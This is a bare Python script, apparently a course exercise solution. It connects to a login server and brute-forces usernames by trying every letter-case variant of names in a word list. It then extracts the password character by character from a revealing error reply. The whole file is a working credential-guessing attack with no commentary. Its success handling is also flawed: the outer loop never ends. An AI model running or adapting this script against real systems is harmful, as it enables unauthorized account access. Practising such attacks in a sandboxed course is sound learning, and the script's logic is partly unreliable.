# write your code her
import json
import argparse
import socket
import itertools
import string

parser = argparse.ArgumentParser(description='Establish a socket connection with given hostname and port')
parser.add_argument('ip', help='IP-Address')
parser.add_argument('port', help='Port Number')
args = parser.parse_args()

abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

sucess = {
    "result": "Connection success!"
}

log = {
    "result": "Wrong login!"
}

exception = {
    "result": "Exception happened during login"
}

w_password = {
    "result": "Wrong password!"
}

with socket.socket() as client_socket:
    hostname = str(args.ip)
    port = int(args.port)

    address = (hostname,port)
    client_socket.connect(address)
    l = open('logins.txt','r')
    login = ''
    password = ''
    test = []
    for i in range(1,26):
        cur = l.readline().strip()
        test.append(list(map(''.join,itertools.product(*zip(cur.upper(),cur.lower())))))
    all_login_combinations = [item for sublist in test for item in sublist]
    try:
            for login_combination in all_login_combinations:
                json_request = {"login": login_combination, 'password': ''}
                json_request = json.dumps(json_request)
                client_socket.send(json_request.encode())
                response = json.loads(client_socket.recv(10024).decode())
                if response == w_password:
                    login = login_combination.strip()
            while True:
                for letter in abc:
                    json_request = {'login': login, 'password': password+letter}
                    json_request = json.dumps(json_request)
                    client_socket.send(json_request.encode())
                    response = json.loads(client_socket.recv(10024).decode())
                    if response == exception:
                        password += letter
                    elif response == sucess:
                        print(json_request)
                        break
    except (ConnectionAbortedError,ConnectionResetError):
        pass
    l.close()
